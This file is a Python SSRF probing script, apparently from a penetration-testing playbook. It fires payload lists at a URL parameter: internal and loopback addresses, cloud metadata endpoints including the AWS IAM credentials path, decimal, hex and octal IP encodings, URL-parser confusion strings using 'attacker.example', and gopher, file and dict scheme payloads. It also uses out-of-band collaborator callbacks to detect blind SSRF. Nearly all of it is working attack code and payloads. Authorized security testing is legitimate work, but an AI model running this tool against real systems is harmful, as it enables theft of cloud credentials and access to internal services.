#!/usr/bin/env python3
"""
ssrf-probe.py — Server-Side Request Forgery probe with bypass variants.

Used in playbook 08 §8.4.

Sends a series of SSRF candidate URLs to a target endpoint that
accepts a URL parameter, and observes:
  - whether the server fetched (response signal varies)
  - whether out-of-band callback fired (interactsh / Burp Collaborator)
  - what error / response is returned

Usage:
  ./ssrf-probe.py \\
    --url 'https://target.example/api/preview?source={URL}' \\
    --method GET \\
    --collaborator-domain abc123.oast.fun \\
    [--cookie 'sid=...'] \\
    [--header 'Authorization: Bearer ...'] \\
    [--variant-set all]

The {URL} placeholder is replaced with each candidate.

Variant sets:
  - basic:    127.0.0.1, localhost, internal IPs.
  - cloud:    AWS/GCP/Azure metadata endpoints.
  - bypass:   URL parser tricks, IP encoding, redirects.
  - oob:      out-of-band only (Collaborator).
  - all:      everything above.

Always include a Collaborator/oast.fun domain so blind-SSRF is
captured.
"""

import argparse
import sys
import time

try:
    import requests
except ImportError:
    print("requires: pip install requests", file=sys.stderr)
    sys.exit(1)


PAYLOADS_BASIC = [
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:6379/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://10.0.0.1/",
    "http://192.168.0.1/",
    "http://172.16.0.1/",
]

PAYLOADS_CLOUD = [
    # AWS IMDS v1
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    # AWS IMDS v2 — needs token, but probing reachability
    "http://169.254.169.254/latest/api/token",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/instance/",
    "http://metadata/computeMetadata/v1/instance/",
    "http://169.254.169.254/computeMetadata/v1/instance/",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Alibaba
    "http://100.100.100.200/latest/meta-data/",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",
]

PAYLOADS_BYPASS = [
    # Decimal IP
    "http://2130706433/",
    # Hex IP
    "http://0x7f000001/",
    # Octal IP
    "http://0177.0000.0000.0001/",
    # IPv4-mapped IPv6
    "http://[::ffff:127.0.0.1]/",
    # nip.io / sslip.io
    "http://127.0.0.1.nip.io/",
    "http://localtest.me/",
    # URL parser confusion
    "http://attacker.example@127.0.0.1/",
    "http://127.0.0.1#@attacker.example/",
    "http://127.0.0.1?@attacker.example/",
    "http://attacker.example#127.0.0.1/",
    # Schemes
    "gopher://127.0.0.1:6379/_INFO",
    "file:///etc/hostname",
    "dict://127.0.0.1:11211/stats",
    "ftp://127.0.0.1/",
    # Double URL encoding
    "http://%31%32%37.0.0.1/",
]

PAYLOAD_OOB_TEMPLATE = "http://{collab}/{label}"


def main():
    p = argparse.ArgumentParser(description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--url", required=True,
        help="target URL with {URL} placeholder")
    p.add_argument("--method", default="GET")
    p.add_argument("--collaborator-domain",
        help="OAST collaborator domain for blind-SSRF detection")
    p.add_argument("--cookie", action="append", default=[])
    p.add_argument("--header", action="append", default=[])
    p.add_argument("--variant-set",
        choices=["basic", "cloud", "bypass", "oob", "all"], default="all")
    p.add_argument("--delay", type=float, default=0.3)
    p.add_argument("--timeout", type=float, default=15.0)
    args = p.parse_args()

    if "{URL}" not in args.url:
        print("error: --url must contain {URL} placeholder", file=sys.stderr)
        sys.exit(1)

    payloads = []
    if args.variant_set in ("basic", "all"):
        payloads += [(p, "basic") for p in PAYLOADS_BASIC]
    if args.variant_set in ("cloud", "all"):
        payloads += [(p, "cloud") for p in PAYLOADS_CLOUD]
    if args.variant_set in ("bypass", "all"):
        payloads += [(p, "bypass") for p in PAYLOADS_BYPASS]
    if args.variant_set in ("oob", "all") and args.collaborator_domain:
        for label in ["base", "after-redirect", "after-dnsrebind"]:
            payloads.append(
                (PAYLOAD_OOB_TEMPLATE.format(
                    collab=args.collaborator_domain, label=label), "oob"))

    if not payloads:
        print("no payloads selected", file=sys.stderr)
        sys.exit(1)

    cookies = {}
    for c in args.cookie:
        if "=" in c:
            k, v = c.split("=", 1)
            cookies[k.strip()] = v.strip()

    headers = {"User-Agent": "OBSIDIAN/1.0 (+playbook-08-ssrf)"}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    print(f"target           : {args.url}")
    print(f"method           : {args.method}")
    print(f"variant set      : {args.variant_set}")
    print(f"payloads         : {len(payloads)}")
    if args.collaborator_domain:
        print(f"collaborator     : {args.collaborator_domain}")
        print("  (manually check OAST host for incoming requests after this run)")
    print()
    print(f"{'class':>8} {'len':>5} {'status':>6} | {'payload':<60}")
    print("-" * 95)

    results = []
    for payload, klass in payloads:
        target = args.url.replace("{URL}", payload)
        try:
            r = requests.request(args.method, target,
                                 cookies=cookies, headers=headers,
                                 timeout=args.timeout,
                                 allow_redirects=False, verify=False)
            line = f"{klass:>8} {len(r.content):>5} {r.status_code:>6} | {payload}"
            results.append((klass, payload, r.status_code, len(r.content),
                            r.text[:200]))
        except requests.RequestException as e:
            line = f"{klass:>8} {0:>5} {'ERR':>6} | {payload}  ({e.__class__.__name__})"
            results.append((klass, payload, -1, 0, str(e)))
        print(line)
        time.sleep(args.delay)

    # Highlight outliers
    print("\n=== outliers (different status or size) ===")
    by_status = {}
    for klass, payload, status, length, body in results:
        key = (status, length // 50)  # bucket by length / 50
        by_status.setdefault(key, []).append((klass, payload))
    for key, items in sorted(by_status.items()):
        if len(items) <= 2:
            print(f"  status={key[0]} length≈{key[1]*50}-{key[1]*50+49}: "
                  f"{len(items)} payload(s)")
            for k, p in items:
                print(f"    [{k}] {p}")

    if args.collaborator_domain:
        print(f"\nNow check the collaborator: any inbound to {args.collaborator_domain}? "
              f"If yes — blind SSRF confirmed.")


if __name__ == "__main__":
    # silence verify=False warning
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
